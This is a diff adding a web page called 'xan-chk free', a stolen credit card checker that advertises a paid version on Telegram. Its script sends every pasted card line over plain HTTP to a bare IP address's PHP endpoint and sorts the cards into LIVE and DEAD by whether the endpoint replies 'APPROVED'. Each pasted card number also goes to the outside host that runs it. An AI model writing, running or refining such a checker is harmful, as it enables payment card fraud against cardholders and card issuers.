@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: montserrat, sans-serif;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 36px;
+        }
+
+        p {
+            font-style: italic;
+        }
+
+        #inputTextArea {
+            padding: 10px;
+            width: 80%;
+            height: 200px;
+            border: 2px solid white;
+            border-radius: 5px;
+            background-color: transparent;
+            color: white;
+            font-family: arial, sans-serif;
+        }
+
+        button {
+            background-color: green;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: darkgreen;
+        }
+
+        #live, #dead {
+            display: none; /* Initially hide the content */
+            border: 1px solid white;
+            border-radius: 5px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+
+        .expand-button {
+            background-color: transparent;
+            border: none;
+            color: white;
+            cursor: pointer;
+        }
+
+        .expanded {
+            color: white;
+            background-color: darkgray;
+        }
+    </style>
+</head>
+<body>
+    <h1>xan-chk free</h1>
+    <p>by roaxx and rockyy</p>
+  <p style="font-size: 12px;">
+    with this checker you can check up to 50 cards for free, if you exceed this amount buy a checker on t.me/xancheck
+  </p>
+
+    <textarea placeholder="Paste here" id="inputTextArea"></textarea> <br> <br>
+    <button onclick="checkEveryLine()">Check Cards</button> <br> <br>
+
+    <div>
+        <button class="expand-button" id="live-button" onclick="toggleExpand('live')">LIVE</button>
+        <span id="live-count">0</span>
+    </div>
+    <div id="live" class="expanded"></div>
+
+    <div>
+        <button class="expand-button" id="dead-button" onclick="toggleExpand('dead')">DEAD</button>
+        <span id="dead-count">0</span>
+    </div>
+    <div id="dead" class="expanded"></div>
+
+    <script>
+        function checkEveryLine() {
+            const inputTextArea = document.getElementById("inputTextArea");
+            const liveDiv = document.getElementById("live");
+            const deadDiv = document.getElementById("dead");
+            const liveButton = document.getElementById("live-button");
+            const deadButton = document.getElementById("dead-button");
+            const liveCount = document.getElementById("live-count");
+            const deadCount = document.getElementById("dead-count");
+            const lines = inputTextArea.value.split('\n');
+
+            lines.forEach(async (one_line) => {
+                const response = await fetch(`http://51.20.124.87/xan0.php?cc=${one_line}`);
+                const responseText = await response.text();
+
+                if (responseText.includes("APPROVED")) {
+                    liveDiv.innerHTML += `LIVE | ${one_line}<br>`;
+                    liveCount.textContent = parseInt(liveCount.textContent) + 1;
+                } else {
+                    deadDiv.innerHTML += `DEAD | ${one_line}<br>`;
+                    deadCount.textContent = parseInt(deadCount.textContent) + 1;
+                }
+            });
+        }
+
+        function toggleExpand(id) {
+            const contentDiv = document.getElementById(id);
+            const button = document.getElementById(`${id}-button`);
+
+            if (contentDiv.style.display === "none") {
+                contentDiv.style.display = "block";
+                contentDiv.classList.add("expanded");
+                button.style.backgroundColor = "green";
+            } else {
+                contentDiv.style.display = "none";
+                contentDiv.classList.remove("expanded");
+                button.style.backgroundColor = "transparent";
+            }
+        }
+    </script>
+</body>
+</html>
